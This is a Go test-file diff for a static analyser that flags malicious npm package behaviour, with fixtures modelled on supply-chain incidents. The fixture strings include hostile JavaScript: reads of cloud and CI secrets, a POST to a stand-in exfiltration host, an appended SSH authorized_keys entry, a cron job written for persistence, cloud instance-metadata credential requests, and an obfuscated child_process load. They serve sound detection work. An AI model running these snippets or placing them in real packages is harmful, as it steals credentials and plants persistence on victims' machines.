@@ -350,3 +350,101 @@ func TestIncident_ShaiHulud(t *testing.T) {
 	assert.Equal(t, 0, b.SensitivePathReads,
 		"reading ./package.json is ordinary I/O — must not flag")
 }
+
+// TestThreat_EnvCredentialHarvest models the dominant npm
+// credential-harvest primitive (TanStack/litellm/bufferzonecorp):
+// reading named cloud/CI secrets out of process.env. All three access
+// shapes — dotted, computed-string, and destructured — must count;
+// ordinary config env reads must not.
+func TestThreat_EnvCredentialHarvest(t *testing.T) {
+	t.Parallel()
+	malicious := "" +
+		"const a = process.env.AWS_SECRET_ACCESS_KEY;\n" +
+		"const b = process.env['NPM_TOKEN'];\n" +
+		"const { GITHUB_TOKEN, VAULT_TOKEN } = process.env;\n" +
+		"require('https').request('https://exfil.evil', { method: 'POST' });\n"
+	c := counts(t, malicious)
+	assert.GreaterOrEqual(t, c.EnvCredentialReads, 4,
+		"AWS_SECRET_ACCESS_KEY, NPM_TOKEN, GITHUB_TOKEN, VAULT_TOKEN — "+
+			"dotted, computed, and destructured reads all count")
+	assert.Positive(t, c.NetworkCallSites, "the exfil channel still fires")
+
+	benign := "" +
+		"const env = process.env.NODE_ENV || 'production';\n" +
+		"const port = process.env.PORT;\n" +
+		"const dbg = process.env['DEBUG'];\n"
+	bc := counts(t, benign)
+	assert.Equal(t, 0, bc.EnvCredentialReads,
+		"NODE_ENV/PORT/DEBUG are ordinary config — must not spike a "+
+			"credential read (catalog-matched, not any-env-read)")
+}
+
+// TestThreat_PersistenceWrites models the recurring post-exploitation
+// step (TanStack .claude/.vscode, bufferzonecorp authorized_keys
+// append, node-ipc): writing to a persistence / credential-tamper
+// path. Resolvable persistence paths count; a runtime-built path is a
+// conservative miss; ordinary build output must not flag.
+func TestThreat_PersistenceWrites(t *testing.T) {
+	t.Parallel()
+	malicious := "" +
+		"const fs = require('fs');\n" +
+		"fs.appendFileSync('/home/ci/.ssh/authorized_keys', attackerKey);\n" +
+		"require('fs').writeFileSync('/etc/cron.d/sysmon', job);\n" +
+		"fs.createWriteStream(process.env.HOME + '/.bashrc');\n"
+	c := counts(t, malicious)
+	assert.Equal(t, 2, c.SensitivePathWrites,
+		"authorized_keys append + /etc/cron.d write are resolvable "+
+			"persistence writes; the HOME+'/.bashrc' path is runtime-built "+
+			"(conservative miss, never a false guess)")
+
+	benign := "const fs = require('fs');\nfs.writeFileSync('./dist/bundle.js', code);\n"
+	bc := counts(t, benign)
+	assert.Equal(t, 0, bc.SensitivePathWrites,
+		"writing build output is ordinary I/O — must not flag")
+}
+
+// TestThreat_CloudMetadataPivot models the SSRF-to-IMDS credential
+// mint (TanStack AWS IMDSv2, litellm). A metadata-host destination is
+// counted distinctly from ordinary egress (near-zero false positive);
+// a normal API call is NetworkCallSites, not CloudMetadataCalls.
+func TestThreat_CloudMetadataPivot(t *testing.T) {
+	t.Parallel()
+	for _, url := range []string{
+		"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+		"http://169.254.170.2/v2/credentials",
+		"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+	} {
+		c := counts(t, "require('http').get('"+url+"');\n")
+		assert.Equalf(t, 1, c.CloudMetadataCalls,
+			"%s is an instance-metadata endpoint", url)
+		assert.Equalf(t, 0, c.NetworkCallSites,
+			"a metadata call is counted as cloud-metadata, not generic egress (%s)", url)
+	}
+
+	benign := counts(t, "require('https').get('https://api.example.com/v1/things');\n")
+	assert.Equal(t, 0, benign.CloudMetadataCalls)
+	assert.Positive(t, benign.NetworkCallSites,
+		"an ordinary API call is generic network egress, not metadata")
+}
+
+// TestThreat_DynamicRequireIsCodeFromData: require()/import() of a
+// non-literal is the same code-from-data indirection as eval — the
+// obfuscated-dropper shape — and counts as DynamicEvalCalls. A static
+// literal require/import is an ordinary dependency load and must not.
+func TestThreat_DynamicRequireIsCodeFromData(t *testing.T) {
+	t.Parallel()
+	mal := counts(t, ""+
+		"require(decodeURIComponent(stage1));\n"+
+		"const m = 'ch' + 'ild_process';\nrequire(m);\n"+
+		"import(attackerControlled);\n")
+	assert.GreaterOrEqual(t, mal.DynamicEvalCalls, 3,
+		"require(call-result), require(name), import(name) are all "+
+			"code-from-data module loads")
+
+	ben := counts(t, ""+
+		"const fs = require('fs');\n"+
+		"require('child_process');\n"+
+		"import('./lazy-feature.js');\n")
+	assert.Equal(t, 0, ben.DynamicEvalCalls,
+		"static string require/import is an ordinary dependency load")
+}
